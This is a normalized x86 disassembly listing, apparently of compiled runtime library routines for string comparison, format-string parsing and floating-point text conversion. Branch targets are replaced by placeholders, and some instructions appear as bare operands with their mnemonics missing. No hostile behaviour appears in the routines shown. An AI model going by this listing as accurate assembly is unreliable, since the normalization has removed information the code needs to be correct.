push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b50
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408bd8
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40898c
mov esi eax
inc esi
mov eax esi
call sub_408bb8
mov ecx esi
mov edx ebx
call sub_4089b8
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408c14
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c694
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4089b8
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407e08
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408c9c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408ff3
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408d7e
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408dc6
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408d7e
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408c90
pop edx
or edx edx
je r-xdata
sub_408d7e
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408ff3
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408dc6
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408ff3
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408c14
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408ded ]
mov ebx ecx
sub cl 0x44
je sub_408220
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4042bc
jmp r-xdata
mov esi sub_40431c
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408220
sub cl 0x44
je sub_4081b4
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_4081b4
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408220
mov ecx 0x10
cmp bl 0x58
je sub_4081b4
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408c6c
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_4091ac
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4081b4
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_409014
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40898c
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408c9c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_409054
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40898c
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408c9c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4090a8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404354
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404354
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404354
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408c9c
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404184
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404094
mov eax esi
mov edx ebx
call sub_4046e0
mov eax [ ebp - 0x4 ]
call sub_404354
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408c9c
mov edx esi
xchg edx eax
call sub_4046e0
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409168
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_4091ac
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409774
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4092ab
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4092b5
call sub_4092ab
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409168
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409311
call sub_4092ab
call sub_4092a2
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_4092a2
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409168
retn
xor ecx ecx
sub_40934d
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_4092a2
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_4092a2
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4093b2
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409406
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_40934d
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409480
push ebp
mov ebp esp
add esp 0xffffffb8
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov edi edx
mov ebx ecx
mov [ ebp - 0x8 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x9 ] al
mov al [ rw-data ]
mov [ ebp - 0xa ] al
mov ecx 0x2
cmp bl 0x0
je r-xdata
movzx eax [ edi + 0x8 ]
or eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
mov eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
call sub_409562
je r-xdata
movzx ecx [ edi + 0x8 ]
shr ecx 0xf
mov ecx [ edi + 0x4 ]
shr ecx 0x1f
jmp r-xdata
push 0x0
push 0xf
push 0x0
mov eax [ ebp - 0x4 ]
mov edx edi
mov ecx ebx
call sub_4091ac
jmp r-xdata
call sub_40959d
mov eax [ ebp - 0x10 ]
mov edx 0x270f
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x4
push eax
push edx
lea eax [ ebp - 0x30 ]
mov edx edi
mov ecx ebx
call sub_409774
mov ax [ ebp - 0x30 ]
cmp ax 0x8000
je r-xdata
sub eax [ ebp - 0x18 ]
mov edx eax
mov eax 0x12
cmp ax 0x7fff
je r-xdata
cmp bl 0x0
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
cmp ax 0x12
jle r-xdata
call sub_409648
jmp r-xdata
mov ecx 0x2
call sub_409562
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
cmp esi [ ebp - 0x34 ]
je r-xdata
call sub_40959d
sub_409562
mov esi [ ebp + 0x8 ]
jecxz r-xdata
mov esi [ ebp + 0x8 ]
mov al [ esi ]
or al al
je r-xdata
lodsb [ esi ]
cmp al 0x27
je r-xdata
retn
cmp al 0x3b
mov ah al
cmp al 0x22
je r-xdata
or al al
jne r-xdata
or al al
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
loop r-xdata
mov al [ esi ]
or al al
je r-xdata
cmp al 0x3b
jne r-xdata
sub_40959d
push ebx
mov [ ebp - 0x34 ] esi
mov ebx 0x7fff
xor ecx ecx
xor edx edx
mov [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x35 ] dl
mov [ ebp - 0x11 ] dl
inc edx
jmp r-xdata
cmp al 0x30
je r-xdata
lodsb [ esi ]
cmp edx ebx
jge r-xdata
cmp al 0x2e
je r-xdata
inc edx
mov ecx edx
jmp r-xdata
mov ebx edx
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
cmp al 0x2c
je r-xdata
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x35 ] 0x1
jmp r-xdata
cmp al 0x27
je r-xdata
mov ah al
cmp al 0x22
je r-xdata
or al al
jne r-xdata
cmp al 0x45
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
jmp r-xdata
lodsb [ esi ]
cmp al 0x2d
je r-xdata
cmp al 0x65
je r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x11 ] 0x1
cmp al 0x2b
jne r-xdata
cmp al 0x3b
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax ecx
jle r-xdata
mov [ ebp - 0x18 ] edx
lodsb [ esi ]
cmp al 0x30
je r-xdata
jmp r-xdata
cmp al 0x23
je r-xdata
or al al
jne r-xdata
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x18 ]
sub eax ebx
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x40 ] eax
pop ebx
retn
xor eax eax
sub_409648
cmp [ ebp - 0x11 ] 0x0
je r-xdata
movsx eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0x18 ]
xor edx edx
jmp r-xdata
movsx edx [ ebp - 0x30 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x48 ] edx
mov esi [ ebp - 0x34 ]
mov edi [ ebp - 0x4 ]
lea ebx [ ebp - 0x2d ]
cmp [ ebp - 0x2e ] 0x0
je r-xdata
lodsb [ esi ]
cmp al 0x23
je r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
call sub_409703
jmp r-xdata
cmp al 0x30
je r-xdata
mov al 0x2d
stosb [ edi ]
cmp al 0x2e
je r-xdata
cmp al 0x2c
je r-xdata
cmp al 0x27
je r-xdata
mov ah al
cmp al 0x22
je r-xdata
or al al
je r-xdata
cmp al 0x45
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
retn
stosb [ edi ]
jmp r-xdata
mov ah [ esi ]
cmp ah 0x2b
je r-xdata
cmp al 0x65
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
mov ecx 0xffffffff
cmp ah 0x2d
jne r-xdata
cmp al 0x3b
je r-xdata
inc ecx
inc esi
cmp [ esi ] 0x30
je r-xdata
cmp ecx 0x4
jb r-xdata
stosb [ edi ]
jmp r-xdata
xor ah ah
or al al
je r-xdata
push ebx
mov bl [ ebp - 0x2d ]
movsx edx [ ebp - 0x30 ]
sub edx [ ebp - 0x18 ]
call sub_409168
pop ebx
jmp r-xdata
mov ecx 0x4
sub_409703
cmp [ ebp - 0x48 ] 0x0
je sub_409724
jl r-xdata
inc [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
cmp eax [ ebp - 0x40 ]
jle r-xdata
call sub_409724
dec [ ebp - 0x48 ]
jne r-xdata
mov al 0x30
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
jmp r-xdata
jmp sub_409724
stosb [ edi ]
cmp [ ebp - 0x35 ] 0x0
je r-xdata
mov ah al
mov al [ ebp - 0x9 ]
stosw [ edi ]
jmp r-xdata
dec [ ebp - 0x44 ]
retn
mov eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
mov dl 0x3
div dl
cmp ah 0x1
jne r-xdata
mov al [ ebp - 0xa ]
test al al
je r-xdata
stosb [ edi ]
sub_409724
mov al [ ebx ]
inc ebx
or al al
jne r-xdata
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
dec ebx
mov eax [ ebp - 0x44 ]
cmp eax [ ebp - 0x3c ]
jle r-xdata
stosb [ edi ]
cmp [ ebp - 0x35 ] 0x0
je r-xdata
mov ah al
mov al [ ebp - 0x9 ]
stosw [ edi ]
jmp r-xdata
dec [ ebp - 0x44 ]
retn
mov al 0x30
mov eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
mov dl 0x3
div dl
cmp ah 0x1
jne r-xdata
mov al [ ebp - 0xa ]
test al al
je r-xdata
stosb [ edi ]
sub_409774
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4097a1
jmp r-xdata
call sub_4098c3
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4097a1
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ea0
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4098c3
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4099a0
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409a57
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409a62
neg edx
mov ecx esi
call sub_409a62
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409a57
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409a7e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ea0
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409a62
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409a7e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409ab4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_4091ac
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404184
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409ae4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_4091ac
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404184
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409b14
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404354
cmp eax 0xe0
jle r-xdata
mov eax ebx
call sub_404554
push eax
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x100 ]
xor ecx ecx
call sub_409480
mov ecx eax
lea edx [ ebp - 0x100 ]
